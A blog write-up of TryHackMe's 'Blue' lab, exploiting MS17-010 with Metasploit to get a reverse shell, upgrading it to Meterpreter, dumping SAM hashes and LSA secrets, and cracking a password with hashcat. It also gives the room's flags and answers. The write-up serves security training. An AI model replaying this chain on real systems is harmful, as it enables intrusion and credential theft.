---
title: "Blue"
date: 2020-02-12T14:35:31+01:00
draft: false
tags: ["CTF", "eternalblue", "hashcat", "metasploit", "MS17-010", "tryhackme"]
---

Hello everyone, today we look at the CTF with [MS17-010](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010) vulnerability.
So let's start with nmap scan.

```bash
$ nmap -sV -p0-1000 --script vuln 10.10.223.243
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-12 14:40 CET
Nmap scan report for 10.10.223.243
Host is up (0.043s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

 Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.73 seconds
```

__How many ports are open with a port number under 1000?:__
- 3

__What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)__
- ms17-010

MS17-010 is very [unstable](https://github.com/rapid7/metasploit-framework/issues/11964) exploit, it doesn't work in my linux or macos machine. But it works in my android with [termux](https://termux.com) app. You can also buy PRO account and use their own kali machine.
So now I connect to my android phone and then we will continue to exploit server

```bash
$ ssh 192.168.xx.yy -p8022 -lxxx_yyy
Welcome to Termux!

Wiki:            https://wiki.termux.com
Community forum: https://termux.com/community
Gitter chat:     https://gitter.im/termux/termux
IRC channel:     #termux on freenode

Working with packages:

 * Search packages:   pkg search <query>
 * Install a package: pkg install <package>
 * Upgrade packages:  pkg upgrade

Subscribing to additional repositories:

 * Root:     pkg install root-repo
 * Unstable: pkg install unstable-repo
 * X11:      pkg install x11-repo

Report issues at https://termux.com/issues

$
```

Now we can continue as on any other devices, so let's start *metasploit*

```bash
Unable to handle kernel NULL pointer dereference at virtual address 0xd34db33f                                                                         
EFLAGS: 00010046                                                                                                                                              
eax: 00000001 ebx: f77c8c00 ecx: 00000000 edx: f77f0001                                                                                                       
esi: 803bf014 edi: 8023c755 ebp: 80237f84 esp: 80237f60
ds: 0018   es: 0018  ss: 0018
Process Swapper (Pid: 0, process nr: 0, stackpage=80377000)


Stack: 90909090990909090990909090
       90909090990909090990909090
       90909090.90909090.90909090
       90909090.90909090.90909090
       90909090.90909090.09090900
       90909090.90909090.09090900
       ..........................
       cccccccccccccccccccccccccc
       cccccccccccccccccccccccccc
       ccccccccc.................
       cccccccccccccccccccccccccc
       cccccccccccccccccccccccccc
       .................ccccccccc
       cccccccccccccccccccccccccc
       cccccccccccccccccccccccccc
       ..........................
       ffffffffffffffffffffffffff
       ffffffff..................
       ffffffffffffffffffffffffff
       ffffffff..................
       ffffffff..................
       ffffffff..................


Code: 00 00 00 00 M3 T4 SP L0 1T FR 4M 3W OR K! V3 R5 I0 N5 00 00 00 00
Aiee, Killing Interrupt handler
Kernel panic: Attempted to kill the idle task!
In swapper task - not syncing


       =[ metasploit v5.0.79-dev                          ]
+ -- --=[ 1979 exploits - 1087 auxiliary - 339 post       ]
+ -- --=[ 559 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 > search ms17-010

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```
__Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)__
- exploit/windows/smb/ms17_010_eternalblue

```bash
msf5 > use exploit/windows/smb/ms17_010_eternalblue
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.223.243
```

__Show options and set the one required value. What is the name of this value? (All caps for submission)__
- RHOSTS

```bash
msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit
 
[*] Started reverse TCP handler on 10.8.11.158:4444 
[*] 10.10.223.243:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.223.243:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.223.243:445     - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.223.243:445 - Connecting to target for exploitation.
[+] 10.10.223.243:445 - Connection established for exploitation.
[+] 10.10.223.243:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.223.243:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.223.243:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.223.243:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.223.243:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.223.243:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.223.243:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.223.243:445 - Sending all but last fragment of exploit packet
[*] 10.10.223.243:445 - Starting non-paged pool grooming
[+] 10.10.223.243:445 - Sending SMBv2 buffers
[+] 10.10.223.243:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.223.243:445 - Sending final SMBv2 buffers.
[*] 10.10.223.243:445 - Sending last fragment of exploit packet!
[*] 10.10.223.243:445 - Receiving response from exploit packet
[+] 10.10.223.243:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.223.243:445 - Sending egg to corrupted connection.
[*] 10.10.223.243:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened (10.8.11.158:4444 -> 10.10.223.243:49187) at 2020-03-20 11:49:18 +0100
[+] 10.10.223.243:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.223.243:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.223.243:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=




C:\Windows\system32>
```

Okey, we're in, so let's background the process and migrate shell to meterpreter

```bash
C:\Windows\system32>^Z
Background session 1? [y/N]  y
msf5 exploit(windows/smb/ms17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter
```

__If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)__
- post/multi/manage/shell_to_meterpreter 


```bash
msf5 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on.
```

__Select this (use MODULE_PATH). Show options, what option are we required to change? (All caps for answer)__
- SESSION

```bash
msf5 post(multi/manage/shell_to_meterpreter) > show sessions 

Active sessions
===============

  Id  Name  Type               Information                                                                       Connection
  --  ----  ----               -----------                                                                       ----------
  1         shell x64/windows  Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  10.8.11.158:4444 -> 10.10.223.243:49187 (10.10.223.243)
msf5 post(multi/manage/shell_to_meterpreter) > set SESSION 1 
SESSION => 1
msf5 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.8.11.158:4433 
[*] Post module execution completed
msf5 post(multi/manage/shell_to_meterpreter) > 
[*] Sending stage (180291 bytes) to 10.10.223.243
[*] Meterpreter session 2 opened (10.8.11.158:4433 -> 10.10.223.243:49197) at 2020-03-20 11:57:43 +0100
[*] Stopping exploit/multi/handler
msf5 post(multi/manage/shell_to_meterpreter) > show sessions

Active sessions
===============

  Id  Name  Type                     Information                                                                       Connection
  --  ----  ----                     -----------                                                                       ----------
  1         shell x64/windows        Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  10.8.11.158:4444 -> 10.10.223.243:49187 (10.10.223.243)
  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ JON-PC                                                      10.8.11.158:4433 -> 10.10.223.243:49197 (10.10.223.243)
```

Migrating shell to meterpreter was successful, so we have 2 sessions now. Let's run the second one, the meterpreter session
and migrate process to another process id. 

```bash
msf5 post(multi/manage/shell_to_meterpreter) > sessions 2                                                                                                     
[*] Starting interaction with 2...                                                                                                                            
                                                                                                                                                              
meterpreter > getsystem                                                                                                                                       
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > ps                                                                                                                                              
                                                                                                                                                              
Process List                                                                                                                                                  
============                                                                                                                                                  
                                                                                                                                                              
 PID   PPID  Name                  Arch  Session  User                          Path                                                                          
 ---   ----  ----                  ----  -------  ----                          ----                                                                          
 0     0     [System Process]                                                                                                                                 
 4     0     System                x64   0                                                                                                                    
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe                                                  
 428   712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe                                               
 560   564   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe                                               
 564   556   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe                                                 
 612   556   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe                                               
 624   604   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe                                                 
 664   604   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe                                              
 712   612   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe                                              
 720   612   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe                                                 
 724   712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe                                               
 728   612   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe                                                   
 836   712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe                                               
 904   712   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 952   712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1020  664   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
 1128  712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1184  1348  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
 1204  712   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1348  712   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1384  712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1448  712   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1524  712   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
 1664  712   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1996  712   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 2084  712   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
 2240  2920  powershell.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
 2368  2240  cmd.exe               x86   0        NT AUTHORITY\SYSTEM           C:\Windows\SysWOW64\cmd.exe
 2396  564   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 2404  712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 2556  564   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 2572  712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2604  712   vds.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
 2716  712   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
 2916  564   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 2920  2400  powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 2996  2240  cmd.exe               x86   0        NT AUTHORITY\SYSTEM           C:\Windows\SysWOW64\cmd.exe
meterpreter > migrate 712
[*] Migrating from 2240 to 712...
[*] Migration completed successfully.
```

Yeah, migration was succesful, so we can dump the hashes of users passwords.

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > lsa_dump_sam 
[+] Running as SYSTEM
[*] Dumping SAM
Domain : JON-PC
SysKey : 55bd17830e678f18a3110daf2c17d4c7
Local SID : S-1-5-21-2633577515-2458672280-487782642

SAMKey : c74ee832c5b6f4030dbbc7b51a011b1e

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0

RID  : 000001f5 (501)
User : Guest

RID  : 000003e8 (1000)
User : Jon
  Hash NTLM: ffb43f0de35be4d9917ac0cc8ad57f8d

meterpreter > lsa_dump_secrets 
[+] Running as SYSTEM
[*] Dumping LSA secrets
Domain : JON-PC
SysKey : 55bd17830e678f18a3110daf2c17d4c7

Local name : Jon-PC ( S-1-5-21-2633577515-2458672280-487782642 )
Domain name : WORKGROUP

Policy subsystem is : 1.11
LSA Key(s) : 1, default {888e8eec-afc6-d204-0da2-a847caf129ea}
  [00] {888e8eec-afc6-d204-0da2-a847caf129ea} c3c1bfae498011d6dd37f2710cc970a5e2d80f0e17e6c12237abaaceed8ce04f

Secret  : DefaultPassword
old/text: CDCClubROX

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 dc 31 ac 35 e1 9a 18 b0 0b 5b 06 6d e3 e8 da 89 8b f8 da 71 fa ea 74 03 f4 2b 58 e1 a5 dd 35 ee 81 61 85 a9 53 b1 c7 95 
    full: dc31ac35e19a18b00b5b066de3e8da898bf8da71faea7403f42b58e1a5dd35ee816185a953b1c795
    m/u : dc31ac35e19a18b00b5b066de3e8da898bf8da71 / faea7403f42b58e1a5dd35ee816185a953b1c795
old/hex : 01 00 00 00 c9 22 d6 0b 83 9e dd 98 a7 ad 7a 5a c5 ff 4e bb 8a d2 6f 01 61 be bf d4 bc 70 54 70 fd df 46 12 a8 c5 e5 2d 98 6c 79 71 
    full: c922d60b839edd98a7ad7a5ac5ff4ebb8ad26f0161bebfd4bc705470fddf4612a8c5e52d986c7971
    m/u : c922d60b839edd98a7ad7a5ac5ff4ebb8ad26f01 / 61bebfd4bc705470fddf4612a8c5e52d986c7971

Secret  : NL$KM
cur/hex : 45 94 4a 93 a2 9d d2 8e 2b cf 5f df 66 75 59 4c e9 bc b8 91 2c 66 59 1e bf 53 1e 77 be c2 9b 74 73 64 04 b4 56 ea 7d 6f ba c2 1b 7e f0 ba 53 67 e6 e6 66 84 95 1f 90 60 42 ee 34 0a ee 99 9f 55 
```

__Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?__
- Jon

Now we can crack the hashes. It doesn't care if we use [john-the-ripper](https://www.openwall.com/john/) or [hashcat](https://hashcat.net/hashcat/).

```bash
$ echo 'ffb43f0de35be4d9917ac0cc8ad57f8d' > hashes.txt
$ hashcat -m 1000 -O hashes.txt /usr/local/share/wordlists/rockyou.txt
Dictionary cache hit:                                                                    
* Filename..: /usr/local/share/wordlists/rockyou.txt                                     
* Passwords.: 14344384                                                                   
* Bytes.....: 139921497                                                                                                                                                           
* Keyspace..: 14344384                                                                                                                                                            
                                                                                                                                                                                  ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22                                                
                                                                                                                                                                                  
Session..........: hashcat                                                                                                                                                        
Status...........: Cracked
Hash.Type........: NTLM
Hash.Target......: ffb43f0de35be4d9917ac0cc8ad57f8d
Time.Started.....: Fri Mar 20 16:12:30 2020 (3 secs)
Time.Estimated...: Fri Mar 20 16:12:33 2020 (0 secs)
Guess.Base.......: File (/usr/local/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:  3946.0 kH/s (7.80ms) @ Accel:64 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 10223616/14344384 (71.27%)
Rejected.........: 0/10223616 (0.00%)
Restore.Point....: 10027008/14344384 (69.90%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#2....: april669 -> alisonodonnell1

Started: Fri Mar 20 16:12:27 2020
Stopped: Fri Mar 20 16:12:34 2020
```

__Copy this password hash to a file and research how to crack it. What is the cracked password?__
- alqfna22

```bash
meterpreter > cd C:/
meterpreter > pwd
C:\
meterpreter > ls
Listing: C:\
============

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
40777/rwxrwxrwx   0        dir   2009-07-14 05:18:56 +0200  $Recycle.Bin
40777/rwxrwxrwx   0        dir   2009-07-14 07:08:56 +0200  Documents and Settings
40777/rwxrwxrwx   0        dir   2009-07-14 05:20:08 +0200  PerfLogs
40555/r-xr-xr-x   4096     dir   2009-07-14 05:20:08 +0200  Program Files
40555/r-xr-xr-x   4096     dir   2009-07-14 05:20:08 +0200  Program Files (x86)
40777/rwxrwxrwx   4096     dir   2009-07-14 05:20:08 +0200  ProgramData
40777/rwxrwxrwx   0        dir   2018-12-13 04:13:22 +0100  Recovery
40777/rwxrwxrwx   4096     dir   2018-12-13 00:01:17 +0100  System Volume Information
40555/r-xr-xr-x   4096     dir   2009-07-14 05:20:08 +0200  Users
40777/rwxrwxrwx   16384    dir   2009-07-14 05:20:08 +0200  Windows
100666/rw-rw-rw-  24       fil   2018-12-13 04:47:39 +0100  flag1.txt
0000/---------    3089184  fif   1970-02-07 00:26:08 +0100  hiberfil.sys
0000/---------    3089184  fif   1970-02-07 00:26:08 +0100  pagefile.sys

meterpreter > cat flag1.txt 
flag{access_the_machine}
```

__Flag1? (Only submit the flag contents {CONTENTS})__
- access_the_machine

For final steps, we return back to first session with basic command shell.

```bash
meterpreter > 
Background session 2? [y/N]                                                    
msf5 post(multi/manage/shell_to_meterpreter) > 
msf5 post(multi/manage/shell_to_meterpreter) > sessions 1
[*] Starting interaction with 1...                                             

                                                                               
                                                                               

                                       
Name             : ConsoleHost                                                 
Version          : 2.0                                                         
InstanceId       : 6ab0de61-c602-4a6d-93f5-77a4f1f1c239
UI               : System.Management.Automation.Internal.Host.InternalHostUserI 
                   nterface                                                    
CurrentCulture   : en-US          
CurrentUICulture : en-US                                                       
PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
IsRunspacePushed : False             
Runspace         : System.Management.Automation.Runspaces.LocalRunspace



TJACJVXvCYTTfrcbvutJpyWlidgPcITh

C:\Windows\system32>cd C:\
cd C:\

C:\>dir flag* /s /p
dir flag* /s /p
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\

03/17/2019  02:27 PM                24 flag1.txt
               1 File(s)             24 bytes

 Directory of C:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent

03/17/2019  02:26 PM               482 flag1.lnk
03/17/2019  02:30 PM               848 flag2.lnk
03/17/2019  02:32 PM             2,344 flag3.lnk
               3 File(s)          3,674 bytes

 Directory of C:\Users\Jon\Documents

03/17/2019  02:26 PM                37 flag3.txt
               1 File(s)             37 bytes

 Directory of C:\Windows\System32\config

03/17/2019  02:32 PM                34 flag2.txt
               1 File(s)             34 bytes

     Total Files Listed:
               6 File(s)          3,769 bytes
               0 Dir(s)  22,707,953,664 bytes free

C:\>type C:\Windows\System32\config\flag2.txt
type C:\Windows\System32\config\flag2.txt
flag{sam_database_elevated_access}
C:\>type C:\Users\Jon\Documents\flag3.txt
type C:\Users\Jon\Documents\flag3.txt
flag{admin_documents_can_be_valuable}
C:\>
```

__Flag2? *Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.__
- sam_database_elevated_access

__flag3?__
- admin_documents_can_be_valuable

And that's it, we have NT AUTHORITY\SYSTEM priviledges, we have all the flags, cracked Jon password. We're done here!
I hope you enjoyed it,
bye;)
